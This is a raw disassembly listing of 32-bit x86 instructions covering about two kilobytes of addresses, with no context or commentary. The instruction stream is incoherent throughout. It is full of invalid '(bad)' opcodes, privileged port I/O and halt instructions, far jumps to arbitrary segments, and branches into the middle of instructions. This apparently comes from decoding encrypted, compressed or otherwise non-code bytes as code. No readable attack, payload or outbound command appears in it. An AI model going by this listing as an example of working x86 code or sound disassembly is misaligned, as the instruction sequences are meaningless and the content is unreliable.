  416594:	es jle 0x4165c1
  416597:	sbb    eax,0x9a323154
  41659c:	bound  ecx,QWORD PTR [ecx]
  41659e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41659f:	stc    
  4165a0:	test   eax,0x864691cd
  4165a5:	add    ch,BYTE PTR [eax+0x24]
  4165a8:	pop    ecx
  4165a9:	mov    bl,0x5
  4165ab:	std    
  4165ac:	fwait
  4165ad:	icebp  
  4165ae:	(bad)  
  4165af:	std    
  4165b0:	sub    eax,0xb87a9f15
  4165b5:	loope  0x4165b9
  4165b7:	call   0xc365880e
  4165bc:	sbb    ebx,edi
  4165be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165bf:	and    cl,BYTE PTR [ecx+0x7be1edf8]
  4165c5:	mov    edi,0x1085515f
  4165ca:	pop    ecx
  4165cb:	inc    edx
  4165cc:	or     bl,0x5b
  4165cf:	cmp    bh,ch
  4165d1:	test   al,0xbb
  4165d3:	add    eax,0xb3c7cf59
  4165d8:	jnp    0x4165b5
  4165da:	ss pop ebx
  4165dc:	jne    0x4165c4
  4165de:	in     eax,0x28
  4165e0:	adc    DWORD PTR [edi+0x281946a9],eax
  4165e6:	out    0xbf,al
  4165e8:	(bad)  
  4165e9:	hlt    
  4165ea:	xchg   ebp,eax
  4165eb:	inc    esi
  4165ec:	test   ah,dl
  4165ee:	neg    BYTE PTR [edx]
  4165f0:	sub    DWORD PTR [eax],0x3c75639
  4165f6:	sahf   
  4165f7:	adc    ch,bl
  4165f9:	jb     0x41664c
  4165fb:	xchg   edx,eax
  4165fc:	or     dl,BYTE PTR [esi]
  4165fe:	dec    ecx
  4165ff:	out    dx,al
  416600:	cmp    eax,0x99c9cb60
  416605:	mov    bl,0x9b
  416607:	(bad)  
  416608:	aam    0x5c
  41660a:	pop    esp
  41660b:	dec    ecx
  41660c:	(bad)  
  41660d:	cwde   
  41660e:	cmp    al,BYTE PTR [edi]
  416610:	enter  0xd48e,0xf7
  416614:	xchg   edi,eax
  416615:	aad    0xd0
  416617:	push   ebx
  416618:	push   ecx
  416619:	pop    ebx
  41661a:	add    DWORD PTR [edx],ebp
  41661c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41661d:	sbb    bh,BYTE PTR [ebp+0x0]
  416620:	jno    0x416626
  416622:	ss loope 0x41663a
  416625:	(bad)  
  416626:	clc    
  416627:	ja     0x4165b2
  416629:	cmp    eax,0xd0683f8c
  41662e:	push   ebp
  41662f:	jae    0x41660c
  416631:	shl    ebx,0x3
  416634:	mov    edi,0x2703d955
  416639:	aad    0x1
  41663b:	hlt    
  41663c:	adc    bl,BYTE PTR [ebx-0x1d70b79]
  416642:	xchg   ecx,eax
  416643:	xchg   DWORD PTR [edi+0x13],esp
  416646:	pop    es
  416647:	sub    ebx,DWORD PTR [edi]
  416649:	mov    ch,0x7b
  41664b:	jne    0x4165d5
  41664d:	mov    dl,0xa5
  41664f:	push   ecx
  416650:	mov    cl,0x73
  416652:	dec    edx
  416653:	pushf  
  416654:	adc    al,0x28
  416656:	stos   BYTE PTR es:[edi],al
  416657:	add    eax,0x8c664470
  41665c:	std    
  41665d:	mov    BYTE PTR [edx+0x5],0x4c
  416661:	jl     0x41665a
  416663:	cs imul ebx,esp,0x2eb9045f
  41666a:	sub    eax,0xcb511032
  41666f:	(bad)  
  416670:	je     0x416652
  416672:	sar    ebp,1
  416674:	inc    ebx
  416675:	ret    
  416676:	xchg   ebx,eax
  416677:	pop    ds
  416678:	push   0x28
  41667a:	push   ebx
  41667b:	add    BYTE PTR [edx],0xc5
  41667e:	ret    0x4148
  416681:	loop   0x4166ac
  416683:	push   cs
  416684:	adc    BYTE PTR [ebx],dh
  416686:	stos   DWORD PTR es:[edi],eax
  416687:	stos   DWORD PTR es:[edi],eax
  416688:	rol    ah,1
  41668a:	aad    0x8d
  41668c:	outs   dx,BYTE PTR ds:[esi]
  41668d:	inc    ecx
  41668e:	pop    ecx
  41668f:	push   esp
  416690:	cmp    eax,0x1f83d9e1
  416695:	pop    ebp
  416696:	xchg   ecx,eax
  416697:	jg     0x416699
  416699:	or     al,BYTE PTR [ebx+eax*2-0x633527d6]
  4166a0:	push   cs
  4166a1:	xchg   edx,eax
  4166a2:	sub    dl,BYTE PTR [ecx]
  4166a4:	loopne 0x4166f5
  4166a6:	mov    esp,0xb3fd3670
  4166ab:	je     0x416690
  4166ad:	stc    
  4166ae:	cmp    al,0xae
  4166b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b1:	jno    0x4166e3
  4166b3:	leave  
  4166b4:	and    al,0x68
  4166b6:	xor    DWORD PTR [eax],0x4c94db2c
  4166bc:	aad    0x91
  4166be:	push   eax
  4166bf:	lock mov ds:0xbd7a1120,al
  4166c5:	mov    al,ds:0xd58a6064
  4166ca:	inc    ecx
  4166cb:	xchg   ebx,eax
  4166cc:	out    dx,al
  4166cd:	xchg   edx,eax
  4166ce:	or     al,0xe5
  4166d0:	lock mov ebx,DWORD PTR [ecx+0x40]
  4166d4:	adc    ecx,DWORD PTR [eax+0x41]
  4166d7:	les    eax,FWORD PTR [eax]
  4166d9:	sbb    DWORD PTR [esi+edx*8-0x57a4008e],ecx
  4166e0:	jbe    0x4166b3
  4166e2:	call   esp
  4166e4:	cmp    ch,BYTE PTR [ebx+ecx*2+0x1ca3d27d]
  4166eb:	test   BYTE PTR [edi+0x59f57255],al
  4166f1:	jb     0x416707
  4166f3:	dec    ebx
  4166f4:	shl    BYTE PTR [edx-0x6b],1
  4166f7:	push   0x7e
  4166f9:	mov    edi,0x9afc1bdd
  4166fe:	scas   al,BYTE PTR es:[edi]
  4166ff:	push   esi
  416700:	inc    edi
  416701:	add    al,0x60
  416703:	test   eax,0x65b599a3
  416708:	call   0x412fdf32
  41670d:	mov    esp,0x9c3f0356
  416712:	test   DWORD PTR [ecx-0x73],0x98148cc4
  416719:	xlat   BYTE PTR ds:[ebx]
  41671a:	shr    DWORD PTR [eax-0x1e],1
  41671d:	sbb    eax,0x13d05498
  416722:	xor    ah,cl
  416724:	dec    eax
  416725:	and    eax,0xad090cfd
  41672a:	push   ecx
  41672b:	inc    esp
  41672c:	(bad)  
  41672d:	ins    BYTE PTR es:[edi],dx
  41672e:	xchg   ebx,eax
  41672f:	lahf   
  416730:	bound  edi,QWORD PTR [ebp-0x4]
  416733:	sbb    al,0xaa
  416735:	cwde   
  416736:	push   edx
  416737:	out    0xa8,eax
  416739:	in     eax,dx
  41673a:	jl     0x4166ef
  41673c:	mov    bl,bh
  41673e:	xor    DWORD PTR [ecx+0xc118700],edx
  416744:	add    DWORD PTR [eax-0x1b],edi
  416747:	pop    eax
  416748:	mov    esi,0x3fb76938
  41674d:	(bad)  
  41674e:	inc    esp
  41674f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416750:	sar    BYTE PTR [edi],0x8
  416753:	xchg   edi,eax
  416754:	(bad)  
  416755:	int    0x42
  416757:	add    esp,esi
  416759:	aas    
  41675a:	cs out dx,eax
  41675c:	les    eax,FWORD PTR [edi]
  41675e:	xor    ch,cl
  416760:	in     al,0x91
  416762:	xor    BYTE PTR [eax-0x70],ah
  416765:	dec    edx
  416766:	out    0xe5,eax
  416768:	cmc    
  416769:	inc    eax
  41676a:	and    ch,dh
  41676c:	nop
  41676d:	jo     0x416742
  41676f:	loopne 0x41672a
  416771:	std    
  416772:	push   cs
  416773:	in     al,dx
  416774:	bound  esi,QWORD PTR fs:[edi*1-0x7136f87d]
  41677c:	jno    0x416781
  41677e:	popf   
  41677f:	sbb    eax,0xdc0e14df
  416784:	lock out dx,al
  416786:	push   es
  416787:	jecxz  0x4167b1
  416789:	xchg   dl,ah
  41678b:	xchg   eax,esi
  41678d:	stos   BYTE PTR es:[edi],al
  41678e:	test   al,0xd8
  416790:	mov    esi,0x93e938eb
  416795:	cwde   
  416796:	int3   
  416797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416798:	loopne 0x416723
  41679a:	cmp    BYTE PTR [ecx],dh
  41679c:	test   DWORD PTR ds:0xc44b5c22,edi
  4167a2:	shl    BYTE PTR [edx],0x60
  4167a5:	mov    edi,0x9885754a
  4167aa:	leave  
  4167ab:	mov    esi,0x5314f524
  4167b0:	ins    BYTE PTR es:[edi],dx
  4167b1:	fwait
  4167b2:	xlat   BYTE PTR ds:[ebx]
  4167b3:	(bad)  
  4167b4:	in     al,0x20
  4167b6:	lods   al,BYTE PTR ds:[esi]
  4167b7:	jmp    0x4167f2
  4167b9:	test   al,0x26
  4167bb:	outs   dx,DWORD PTR ds:[esi]
  4167bc:	gs das 
  4167be:	stc    
  4167bf:	dec    edx
  4167c0:	addr16 out dx,al
  4167c2:	mov    al,ds:0xeb9242e1
  4167c7:	neg    ebx
  4167c9:	and    eax,0x1a61b6fa
  4167ce:	jnp    0x4167b5
  4167d0:	int    0xfb
  4167d2:	jle    0x41678b
  4167d4:	call   0x58874212
  4167d9:	or     BYTE PTR [edx+0x1ce3f2a2],al
  4167df:	mov    ebp,tr0
  4167e2:	push   0xdf897f67
  4167e7:	xchg   edx,eax
  4167e8:	pusha  
  4167e9:	retf   
  4167ea:	add    ebx,DWORD PTR [edi]
  4167ec:	repnz call 0x3696:0xe3c34706
  4167f4:	dec    esi
  4167f5:	pop    es
  4167f6:	imul   ebp,DWORD PTR [ebp+eax*2+0x5f],0xffffffe7
  4167fb:	sbb    bh,BYTE PTR [edx+esi*1-0x2f11a9b]
  416802:	int    0xee
  416804:	fcom   DWORD PTR [esi+0x673dee40]
  41680a:	arpl   WORD PTR [ecx-0x54c6217e],bp
  416810:	jmp    0xb7cbe88
  416815:	call   0x131b15ac
  41681a:	mov    esp,0x5b2eba55
  41681f:	cmp    DWORD PTR [esi-0x1ddb90c5],edx
  416825:	ins    DWORD PTR es:[edi],dx
  416826:	pusha  
  416827:	std    
  416828:	mov    eax,0x1e60c4a4
  41682d:	dec    edi
  41682e:	retf   
  41682f:	int    0x73
  416831:	pop    ss
  416832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416833:	jnp    0x416879
  416835:	clc    
  416836:	and    BYTE PTR [edx+ecx*4-0x780abdc9],ah
  41683d:	call   0xb6a73f2f
  416842:	cmc    
  416843:	jp     0x4167e8
  416845:	mov    eax,ds:0x17eae320
  41684a:	push   ebx
  41684b:	sub    esp,eax
  41684d:	ja     0x416820
  41684f:	adc    eax,0xef01c95
  416854:	jl     0x41685d
  416856:	xlat   BYTE PTR ds:[ebx]
  416857:	jb     0x416856
  416859:	clc    
  41685a:	fs aad 0x89
  41685d:	fcmovu st,st(0)
  41685f:	scas   eax,DWORD PTR es:[edi]
  416860:	bound  eax,QWORD PTR [esi+0x41]
  416863:	loopne 0x416819
  416865:	adc    al,al
  416867:	inc    esi
  416868:	and    ah,cl
  41686a:	retf   
  41686b:	mov    bh,0x73
  41686d:	pushf  
  41686e:	push   ebp
  41686f:	mov    al,ds:0x1b808f73
  416874:	xchg   ecx,eax
  416875:	into   
  416876:	jl     0x416851
  416878:	int    0x3c
  41687a:	xor    bl,BYTE PTR [edi]
  41687c:	inc    edx
  41687d:	pop    ds
  41687e:	jae    0x4168fb
  416880:	sub    BYTE PTR [ecx+0x2d],ah
  416883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416884:	adc    DWORD PTR [eax-0x7061e51f],0xfffffffc
  41688b:	call   0xcdee:0x7247573e
  416892:	mov    esp,0x4eeba2b
  416897:	int    0x43
  416899:	sbb    BYTE PTR [edi+0x7e8e843c],cl
  41689f:	push   eax
  4168a0:	lock arpl WORD PTR [eax+esi*8],bx
  4168a4:	test   DWORD PTR [ebx],esi
  4168a6:	das    
  4168a7:	pop    edx
  4168a8:	test   DWORD PTR [ebx],ebp
  4168aa:	xchg   esp,eax
  4168ab:	mov    esp,0x9321186b
  4168b0:	jnp    0x4168ca
  4168b2:	adc    ecx,eax
  4168b4:	data16 fucomip st,st(6)
  4168b7:	nop
  4168b8:	inc    eax
  4168b9:	(bad)  
  4168ba:	fdivr  QWORD PTR [esi+0x1b1e2951]
  4168c0:	mov    ecx,0xc895a044
  4168c5:	mov    ah,0xe0
  4168c7:	adc    BYTE PTR [edx+0x73357853],dl
  4168cd:	jmp    0x8062:0xd2e52aa4
  4168d4:	fld    DWORD PTR [ebp+0x562f159d]
  4168da:	xchg   ecx,eax
  4168db:	pop    esi
  4168dc:	imul   ecx,esp,0x29
  4168df:	mov    bl,0xa
  4168e1:	push   eax
  4168e2:	add    al,BYTE PTR [ebp-0x4e]
  4168e5:	ret    
  4168e6:	sub    al,0x33
  4168e8:	cs pop edi
  4168ea:	imul   edx,DWORD PTR [esi+ebx*8],0xffffffc8
  4168ee:	int    0xb1
  4168f0:	and    al,0xeb
  4168f2:	mov    al,ds:0xddeca21e
  4168f7:	(bad)  
  4168f8:	jecxz  0x4168c7
  4168fa:	int    0x2c
  4168fc:	dec    ecx
  4168fd:	fstp   TBYTE PTR [ecx-0x25c499bd]
  416903:	shr    BYTE PTR [esi+ebp*8],0x22
  416907:	icebp  
  416908:	ror    DWORD PTR [ebx],1
  41690a:	jns    0x416979
  41690c:	mov    ds:0xa69d706c,eax
  416911:	std    
  416912:	push   ss
  416913:	sub    al,al
  416915:	in     al,0x8c
  416917:	xchg   esp,eax
  416918:	dec    edx
  416919:	popf   
  41691a:	xchg   ebx,eax
  41691b:	lods   eax,DWORD PTR ds:[esi]
  41691c:	enterw 0x90a4,0xc8
  416921:	leave  
  416922:	iret   
  416923:	sbb    ch,BYTE PTR [edi+ebx*4+0x69c77e54]
  41692a:	lods   al,BYTE PTR ds:[esi]
  41692b:	repnz sahf 
  41692d:	cs inc edi
  41692f:	mov    ebp,DWORD PTR [edx+0x6f898883]
  416935:	push   esp
  416936:	into   
  416937:	in     al,0x4d
  416939:	je     0x4168ca
  41693b:	dec    ebp
  41693c:	aas    
  41693d:	xor    eax,esp
  41693f:	(bad)  
  416940:	mov    al,ds:0x678c0a4b
  416945:	and    al,0x9f
  416947:	stc    
  416948:	xchg   DWORD PTR [ecx-0x32a7f4ec],ebp
  41694e:	jns    0x41698b
  416950:	push   ds
  416951:	jo     0x416958
  416953:	sbb    bh,cl
  416955:	cmp    BYTE PTR [ebx],0xfc
  416958:	adc    DWORD PTR [esi],ebp
  41695a:	ror    DWORD PTR [edx+0x389e7081],0xf8
  416961:	gs dec esp
  416963:	mov    ecx,esi
  416965:	push   edi
  416966:	mov    edx,0x5daf8f8
  41696b:	jmp    0x416993
  41696d:	sub    BYTE PTR [edx],bh
  41696f:	xor    dl,ah
  416971:	pop    esp
  416972:	mov    ah,0xfa
  416974:	adc    al,0xcf
  416976:	sbb    ah,cl
  416978:	sbb    ebp,eax
  41697a:	adc    ah,BYTE PTR [esi+0x66feef76]
  416980:	(bad)  
  416981:	dec    ebx
  416982:	(bad)  
  416983:	pop    edi
  416984:	es pop eax
  416986:	or     bl,cl
  416988:	and    esi,DWORD PTR [esi+0x3f]
  41698b:	enter  0x7334,0x81
  41698f:	fcom   DWORD PTR [eax+0x574feb09]
  416995:	push   cs
  416996:	call   0x6d36f89f
  41699b:	mov    al,ds:0xa3efcaad
  4169a0:	jnp    0x416995
  4169a2:	add    al,0xb9
  4169a4:	(bad)  
  4169a5:	push   ecx
  4169a6:	daa    
  4169a7:	idiv   DWORD PTR ds:0x7a47451
  4169ad:	test   DWORD PTR [ecx],esp
  4169af:	dec    esp
  4169b0:	clc    
  4169b1:	mov    dl,0xee
  4169b3:	xlat   BYTE PTR ds:[ebx]
  4169b4:	loopne 0x416994
  4169b6:	dec    esi
  4169b7:	sbb    eax,0xa010921f
  4169bc:	fisttp DWORD PTR [eax+ebp*2]
  4169bf:	(bad)  
  4169c0:	repnz stos BYTE PTR es:[edi],al
  4169c2:	fistp  WORD PTR [ebp-0x5d8f89a6]
  4169c8:	fwait
  4169c9:	inc    edi
  4169ca:	cld    
  4169cb:	jo     0x41695c
  4169cd:	std    
  4169ce:	test   al,0xcd
  4169d0:	mov    eax,0xb7d4285
  4169d5:	mov    ch,0xe5
  4169d7:	sub    cl,dh
  4169d9:	jo     0x416a19
  4169db:	inc    ecx
  4169dc:	popf   
  4169dd:	pop    ebp
  4169de:	call   0x35e8:0xaffd350c
  4169e5:	in     al,0x6f
  4169e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169e8:	fwait
  4169e9:	in     eax,dx
  4169ea:	out    0xc0,al
  4169ec:	cdq    
  4169ed:	pop    esp
  4169ee:	and    eax,edx
  4169f0:	shl    DWORD PTR [edx+eax*2+0x7a8c18ae],cl
  4169f7:	ds in  al,dx
  4169f9:	inc    eax
  4169fa:	xchg   ebp,eax
  4169fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169fc:	jne    0x416a46
  4169fe:	jg     0x416a71
  416a00:	push   edx
  416a01:	pop    edx
  416a02:	adc    DWORD PTR [edi],0x174d8087
  416a08:	or     BYTE PTR [ebp-0x7d],al
  416a0b:	test   al,0xe6
  416a0d:	imul   edi,DWORD PTR [ebp-0x42]
  416a11:	and    ebp,edi
  416a13:	xor    dh,BYTE PTR [ecx-0x27]
  416a16:	inc    DWORD PTR [ebx+0x67830053]
  416a1c:	cmp    BYTE PTR [eax+0x79],al
  416a1f:	int3   
  416a20:	std    
  416a21:	adc    edi,ebx
  416a23:	dec    edi
  416a24:	arpl   WORD PTR [ebx],si
  416a26:	dec    eax
  416a27:	add    ecx,ebp
  416a29:	or     al,ah
  416a2b:	addr16 ja 0x4169d2
  416a2e:	or     ebx,DWORD PTR [esi+0x61]
  416a31:	add    eax,0x2ce9b2b
  416a36:	xor    BYTE PTR ss:0xbb68bbc7,al
  416a3d:	jno    0x416a67
  416a3f:	jbe    0x416a27
  416a41:	jmp    0x46737e86
  416a46:	pusha  
  416a47:	inc    esp
  416a48:	lods   eax,DWORD PTR ds:[esi]
  416a49:	mov    ss,WORD PTR [edx+edx*1]
  416a4c:	aaa    
  416a4d:	mov    eax,0xc3b32d20
  416a52:	mov    esp,0xbca00b89
  416a57:	call   0xd1f1f921
  416a5c:	add    al,0x25
  416a5e:	test   DWORD PTR [ebx+0x33f88524],0x8a2dc8a1
  416a68:	aas    
  416a69:	mov    ss,WORD PTR [edx-0x3d]
  416a6c:	retf   0x2cf9
  416a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a70:	call   0xccd82b97
  416a75:	jmp    0x6a11fcff
  416a7a:	sahf   
  416a7b:	cs iret 
  416a7d:	inc    esp
  416a7e:	(bad)  
  416a7f:	loopne 0x416ab2
  416a81:	mov    ecx,0x46bd0750
  416a86:	xor    al,0xc8
  416a88:	in     eax,dx
  416a89:	fiadd  DWORD PTR [edx-0x49390464]
  416a8f:	jg     0x416a27
  416a91:	jmp    0x72ba:0x1e8222fc
  416a98:	cmp    cl,BYTE PTR [ecx+0x12]
  416a9b:	loope  0x416b18
  416a9d:	jecxz  0x416a3b
  416a9f:	jge    0x416aab
  416aa1:	adc    BYTE PTR [ebx+0x70f200be],0x6e
  416aa8:	fcomip st,st(4)
  416aaa:	pop    ebx
  416aab:	stc    
  416aac:	add    cl,BYTE PTR [ebp-0x3acb7bac]
  416ab2:	(bad)  
  416ab3:	mov    ebp,DWORD PTR [esi-0x73]
  416ab6:	dec    ecx
  416ab7:	add    al,0x46
  416ab9:	into   
  416aba:	scas   eax,DWORD PTR es:[edi]
  416abb:	sbb    DWORD PTR [edi-0x7b],esp
  416abe:	push   ebx
  416abf:	inc    edx
  416ac0:	inc    esi
  416ac1:	pop    eax
  416ac2:	(bad)
  416ac6:	(bad)  
  416ac7:	mov    ds:0x615a64b,eax
  416acc:	outs   dx,BYTE PTR ds:[esi]
  416acd:	sahf   
  416ace:	pop    esi
  416acf:	rol    BYTE PTR [eax],cl
  416ad1:	cs mov eax,ecx
  416ad4:	outs   dx,DWORD PTR ds:[esi]
  416ad5:	adc    eax,DWORD PTR [ecx]
  416ad7:	(bad)  
  416ad8:	retf   0xf115
  416adb:	les    esp,FWORD PTR [esi+eax*1-0x32]
  416adf:	test   eax,0x7ab3d21
  416ae4:	aas    
  416ae5:	stos   DWORD PTR es:[edi],eax
  416ae6:	js     0x416b37
  416ae8:	(bad)  [ebp+0x2]
  416aeb:	mov    dl,0xac
  416aed:	stc    
  416aee:	pop    esp
  416aef:	xchg   edx,eax
  416af0:	cmp    DWORD PTR [ecx-0x35361297],esi
  416af6:	jmp    FWORD PTR [edi-0x2f]
  416af9:	push   esi
  416afa:	mov    edi,0x193b84d0
  416aff:	mov    eax,0xccd71591
  416b04:	xor    esi,DWORD PTR [ebp-0x556bf02e]
  416b0a:	lds    ecx,FWORD PTR [esi+edi*1+0x46]
  416b0e:	xchg   edi,eax
  416b0f:	ret    
  416b10:	je     0x416aac
  416b12:	pop    edx
  416b13:	test   DWORD PTR [ecx-0xf],esi
  416b16:	(bad)  
  416b17:	int3   
  416b18:	cmp    al,0x13
  416b1a:	mov    ds:0xa3b233ce,eax
  416b1f:	(bad)  [ebp+esi*8-0x49]
  416b23:	cmp    eax,esi
  416b25:	sti    
  416b26:	stc    
  416b27:	les    edx,FWORD PTR [edx]
  416b29:	mov    WORD PTR [ecx-0x39de0738],gs
  416b2f:	xchg   esi,eax
  416b30:	add    cl,BYTE PTR [ecx-0x1]
  416b33:	ror    DWORD PTR ss:[edi+ebx*8+0x5d],0xee
  416b39:	mov    esp,0xaeead0f1
  416b3e:	mov    DWORD PTR [edx+0xa18b84d],ecx
  416b44:	or     esi,ecx
  416b46:	xchg   BYTE PTR [esi],ch
  416b48:	dec    esi
  416b49:	jbe    0x416adf
  416b4b:	sub    BYTE PTR [esi+0x9],0x9c
  416b4f:	jl     0x416b96
  416b51:	arpl   WORD PTR [eax+esi*2-0x7a],di
  416b55:	jmp    0x416b26
  416b57:	xchg   esi,eax
  416b58:	mov    ?,WORD PTR [eax+0x2d]
  416b5b:	aam    0xb7
  416b5d:	retf   0x37c5
  416b60:	ret    
  416b61:	not    DWORD PTR [edx]
  416b63:	jmp    0x87aa3213
  416b68:	push   esi
  416b69:	fisubr WORD PTR [ecx]
  416b6b:	mov    edi,0xe7b3dba6
  416b70:	jge    0x416bac
  416b72:	std    
  416b73:	mov    edx,0x7324da72
  416b78:	lods   al,BYTE PTR ds:[esi]
  416b79:	sub    al,0xa
  416b7b:	xchg   esp,eax
  416b7c:	add    BYTE PTR [ecx+0x8],al
  416b7f:	(bad)  
  416b80:	fstp   QWORD PTR [edi]
  416b82:	xchg   esi,eax
  416b83:	cmp    bl,BYTE PTR [edx-0x3e]
  416b86:	pop    es
  416b87:	test   eax,0x7be253ac
  416b8c:	mov    ecx,0x624a0d05
  416b91:	fistp  QWORD PTR [esi]
  416b93:	rol    DWORD PTR [esi+0x31cf2d53],1
  416b99:	das    
  416b9a:	dec    ebp
  416b9b:	popf   
  416b9c:	std    
  416b9d:	(bad)  
  416b9e:	pop    esp
  416b9f:	cwde   
  416ba0:	outs   dx,DWORD PTR ds:[esi]
  416ba1:	mov    al,0x9c
  416ba3:	inc    ebx
  416ba4:	sub    BYTE PTR [ebx-0x26de80b0],dh
  416baa:	sub    eax,0xd0108a1
  416baf:	ror    DWORD PTR [esi],0x42
  416bb2:	leave  
  416bb3:	pop    edx
  416bb4:	jmp    0x416c13
  416bb6:	dec    esp
  416bb7:	jns    0x416b53
  416bb9:	xchg   ebp,eax
  416bba:	or     ch,dh
  416bbc:	ja     0x416b74
  416bbe:	stc    
  416bbf:	jnp    0x416bdd
  416bc1:	jle    0x416b7b
  416bc3:	and    eax,ebp
  416bc5:	add    BYTE PTR [ebx],cl
  416bc7:	pop    ebp
  416bc8:	jmp    0x660fffa1
  416bcd:	cmp    DWORD PTR [eax],esp
  416bcf:	lods   al,BYTE PTR ds:[esi]
  416bd0:	push   ebp
  416bd1:	aad    0x33
  416bd3:	retf   0xc730
  416bd6:	test   DWORD PTR ds:0xe4c4ef04,esp
  416bdc:	ja     0x416be0
  416bde:	inc    esi
  416bdf:	inc    ebp
  416be0:	adc    al,0xe
  416be2:	mov    BYTE PTR [esi-0x1d],0x2e
  416be6:	clc    
  416be7:	sahf   
  416be8:	mov    bh,cl
  416bea:	mov    cs,WORD PTR [ebp+0x3c355365]
  416bf0:	xor    DWORD PTR [ebp-0x4e],esi
  416bf3:	stos   DWORD PTR es:[edi],eax
  416bf4:	hlt    
  416bf5:	imul   ecx,DWORD PTR [ebx-0x24eb584],0xffffffd2
  416bfc:	dec    ebx
  416bfd:	not    DWORD PTR [edi+0x48]
  416c00:	xchg   esi,eax
  416c01:	lods   al,BYTE PTR ds:[esi]
  416c02:	inc    edi
  416c03:	or     edi,ecx
  416c05:	cmc    
  416c06:	pop    ebx
  416c07:	addr16 or al,0xf1
  416c0a:	retf   
  416c0b:	adc    al,0xdb
  416c0d:	ret    
  416c0e:	out    dx,al
  416c0f:	mov    eax,0xc32af508
  416c14:	in     eax,0x38
  416c16:	xchg   ebp,eax
  416c17:	sub    ecx,DWORD PTR ds:0xf9b339a3
  416c1d:	lock sub ah,BYTE PTR ds:0x98638f42
  416c24:	adc    eax,0x51671d14
  416c29:	jns    0x416c7e
  416c2b:	mov    edx,?
  416c2d:	xor    bh,cl
  416c2f:	mov    ds:0x882d4b0d,al
  416c34:	xchg   edi,eax
  416c35:	and    BYTE PTR [esp+ebx*8],bl
  416c38:	(bad)  
  416c39:	xchg   esi,eax
  416c3a:	adc    BYTE PTR [eax+esi*1],cl
  416c3d:	xor    DWORD PTR [ebx-0x3f],edi
  416c40:	mov    esi,0xc2c58445
  416c45:	push   ds
  416c46:	int3   
  416c47:	std    
  416c48:	push   es
  416c49:	jp     0x416be2
  416c4b:	jmp    0x416c79
  416c4d:	adc    BYTE PTR [eax+eax*1+0x74],cl
  416c51:	mov    ds:0x96782002,al
  416c56:	ret    0x9ad2
  416c59:	scas   eax,DWORD PTR es:[edi]
  416c5a:	test   al,0x38
  416c5c:	sub    BYTE PTR [edi+0x725a2466],dl
  416c62:	mov    ah,0x51
  416c64:	jl     0x416c3c
  416c66:	inc    ebx
  416c67:	mov    BYTE PTR [edx-0x68],bh
  416c6a:	mov    ecx,edx
  416c6c:	out    dx,eax
  416c6d:	jmp    0x416c22
  416c6f:	cmp    esi,DWORD PTR [esi+0x7f8f7872]
  416c75:	xadd   DWORD PTR [edi+0x7b1b7a8c],edx
  416c7c:	aad    0x7f
  416c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c7f:	add    bl,BYTE PTR [esi-0x354e232f]
  416c85:	jbe    0x416c42
  416c87:	mov    ecx,DWORD PTR [edi]
  416c89:	xchg   bl,ch
  416c8b:	mov    edi,0x3a29f5e0
  416c90:	(bad)  
  416c91:	sbb    ebx,DWORD PTR [eax-0x591ba06c]
  416c97:	mov    al,ds:0xb34df17e
  416c9c:	mov    al,0x64
  416c9e:	loop   0x416cf0
  416ca0:	into   
  416ca1:	mov    bl,bh
  416ca3:	sub    eax,DWORD PTR [esi+edx*2+0x58]
  416ca7:	xchg   ebp,eax
  416ca8:	es sbb al,0xae
  416cab:	(bad)  
  416cac:	loope  0x416cbb
  416cae:	test   eax,0x9cfc75f3
  416cb3:	cld    
  416cb4:	fs jg  0x416c67
  416cb7:	xchg   ebp,eax
  416cb8:	dec    eax
  416cb9:	cmp    al,0x63
  416cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cbc:	mov    DWORD PTR [edi-0x69336db7],ecx
  416cc2:	ins    DWORD PTR es:[edi],dx
  416cc3:	sbb    DWORD PTR [edx-0x51d4f582],ebx
  416cc9:	pop    ebx
  416cca:	mov    bl,0xd9
  416ccc:	mov    edi,ebx
  416cce:	popf   
  416ccf:	leave  
  416cd0:	les    edx,FWORD PTR [ebx+0x8]
  416cd3:	mov    cl,0x6a
  416cd5:	sub    cl,BYTE PTR [edx]
  416cd7:	cld    
  416cd8:	stos   DWORD PTR es:[edi],eax
  416cd9:	cmp    eax,0xbb339120
  416cde:	loope  0x416d36
  416ce0:	(bad)  
  416ce1:	test   DWORD PTR [ebx],ecx
  416ce3:	pop    eax
  416ce4:	push   ebx
  416ce5:	adc    bh,bl
  416ce7:	inc    ebp
  416ce8:	jmp    0x416cd2
  416cea:	mov    esp,edx
  416cec:	sbb    bh,BYTE PTR [ebp*4+0x6f099203]
  416cf3:	cs std 
  416cf5:	out    dx,al
  416cf6:	mov    DWORD PTR [edi],edi
  416cf8:	cs push ecx
  416cfa:	sti    
  416cfb:	xor    BYTE PTR [ebx-0x6f],cl
  416cfe:	mov    ebp,0x27865761
  416d03:	ins    DWORD PTR es:[edi],dx
  416d04:	sub    al,0x20
  416d06:	loope  0x416c98
  416d08:	in     eax,dx
  416d09:	retf   
  416d0a:	push   ebx
  416d0b:	icebp  
  416d0c:	rcl    BYTE PTR [ebx-0x7dcb702f],cl
  416d12:	gs add al,0x4a
  416d15:	dec    edi
  416d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d17:	mov    ch,0x42
  416d19:	adc    al,0x79
  416d1b:	cmc    
  416d1c:	mov    al,BYTE PTR [edx+eax*4-0x58]
  416d20:	xor    bh,BYTE PTR [esi]
  416d22:	frstor [edx-0x5f41c80c]
  416d28:	add    eax,0x3e313560
  416d2d:	sbb    BYTE PTR [ecx-0xf],ch
  416d30:	pop    esp
  416d31:	fs sahf 
  416d33:	inc    esp
  416d34:	xlat   BYTE PTR ds:[ebx]
  416d35:	(bad)  
  416d36:	inc    edx
  416d37:	bound  esi,QWORD PTR [eax+0x3d67d81]
  416d3d:	sbb    bl,al
  416d3f:	loopne 0x416ce9
